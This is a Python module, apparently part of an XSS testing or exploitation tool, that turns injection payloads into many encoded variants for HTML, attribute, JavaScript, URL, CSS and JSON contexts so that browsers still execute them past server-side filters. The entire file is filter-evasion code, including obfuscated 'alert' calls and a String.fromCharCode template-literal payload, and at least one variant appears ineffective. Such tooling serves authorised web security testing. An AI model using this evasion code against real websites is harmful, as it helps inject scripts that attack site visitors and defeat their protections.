"""
modules/encoder.py — Context-aware encoding engine.

Encodes payloads correctly for the injection context so the browser
will parse them despite server-side filters.
"""

import html
import urllib.parse
import re
from typing import List
from core.models import InjectionContext


def encode_for_context(payload: str, context: InjectionContext) -> List[str]:
    """Return a list of context-appropriate encodings of the payload."""
    encoders = {
        InjectionContext.HTML_TEXT:         _html_encodings,
        InjectionContext.HTML_ATTRIBUTE_DQ: _attr_dq_encodings,
        InjectionContext.HTML_ATTRIBUTE_SQ: _attr_sq_encodings,
        InjectionContext.JS_STRING_DQ:      _js_dq_encodings,
        InjectionContext.JS_STRING_SQ:      _js_sq_encodings,
        InjectionContext.JS_TEMPLATE:       _js_template_encodings,
        InjectionContext.URL_PARAM:         _url_encodings,
        InjectionContext.CSS_VALUE:         _css_encodings,
        InjectionContext.JSON_VALUE:        _json_encodings,
    }
    fn = encoders.get(context, _html_encodings)
    return [v for v in fn(payload) if v and v != payload]


# ── HTML text context ──────────────────────────────────────────────────────
def _html_encodings(p: str) -> List[str]:
    return [
        p.replace("<", "&#60;").replace(">", "&#62;"),
        p.replace("<", "&#x3C;").replace(">", "&#x3E;"),
        p.replace("<", "\u003c").replace(">", "\u003e"),
        p.replace("<", "%3C").replace(">", "%3E"),
        p.replace("alert", "&#97;&#108;&#101;&#114;&#116;"),
        p.replace("alert", "\\u0061lert"),
    ]


# ── HTML attribute double-quote context ────────────────────────────────────
def _attr_dq_encodings(p: str) -> List[str]:
    return [
        p.replace('"', '&quot;').replace('<', '&lt;'),
        p.replace('"', '&#34;'),
        p.replace('"', '&#x22;'),
        p.replace(' ', '\t'),      # tab instead of space
        p.replace(' ', '/**/'),    # comment-space
    ]


# ── HTML attribute single-quote context ───────────────────────────────────
def _attr_sq_encodings(p: str) -> List[str]:
    return [
        p.replace("'", "&#39;"),
        p.replace("'", "&#x27;"),
        p.replace("'", "\\'"),
    ]


# ── JS double-quoted string context ───────────────────────────────────────
def _js_dq_encodings(p: str) -> List[str]:
    variants = []
    # Hex-escape the closing quote to break out
    variants.append(p.replace('"', '\\x22'))
    variants.append(p.replace('"', '\\u0022'))
    # Encode the alert keyword
    if "alert" in p:
        variants.append(p.replace("alert", "\\u0061lert"))
        variants.append(p.replace("alert", "\\x61lert"))
    return variants


# ── JS single-quoted string context ───────────────────────────────────────
def _js_sq_encodings(p: str) -> List[str]:
    variants = []
    variants.append(p.replace("'", "\\x27"))
    variants.append(p.replace("'", "\\u0027"))
    if "alert" in p:
        variants.append(p.replace("alert", "\\u0061lert"))
    return variants


# ── JS template literal context ────────────────────────────────────────────
def _js_template_encodings(p: str) -> List[str]:
    return [
        p.replace("`", "\\`"),
        p.replace("${", "\\${"),
        "${String.fromCharCode(97,108,101,114,116)}(1)",
    ]


# ── URL parameter context ──────────────────────────────────────────────────
def _url_encodings(p: str) -> List[str]:
    return [
        urllib.parse.quote(p, safe=""),
        urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
        p.replace("<", "%3C").replace(">", "%3E").replace('"', "%22"),
        p.replace("javascript", "java\tscript"),
        p.replace("javascript", "java&#9;script"),
    ]


# ── CSS context ────────────────────────────────────────────────────────────
def _css_encodings(p: str) -> List[str]:
    return [
        p.replace("<", "\\3C ").replace(">", "\\3E "),
        p.replace("e", "\\65 "),  # CSS unicode escape of letter 'e'
    ]


# ── JSON value context ─────────────────────────────────────────────────────
def _json_encodings(p: str) -> List[str]:
    return [
        p.replace('"', '\\"'),
        p.replace('<', '\\u003c').replace('>', '\\u003e'),
        p.replace("'", "\\'"),
    ]


# ── Utility: char-level to HTML entity ────────────────────────────────────
def to_html_entities(s: str) -> str:
    """Convert every character to decimal HTML entity."""
    return "".join(f"&#{ord(c)};" for c in s)


def to_hex_entities(s: str) -> str:
    """Convert every character to hex HTML entity."""
    return "".join(f"&#x{ord(c):X};" for c in s)


def to_js_unicode(s: str) -> str:
    """Convert every character to JS \\uXXXX escape."""
    return "".join(f"\\u{ord(c):04X}" for c in s)


def to_js_hex(s: str) -> str:
    """Convert every character to JS \\xXX escape (ASCII only)."""
    return "".join(f"\\x{ord(c):02X}" if ord(c) < 256 else c for c in s)
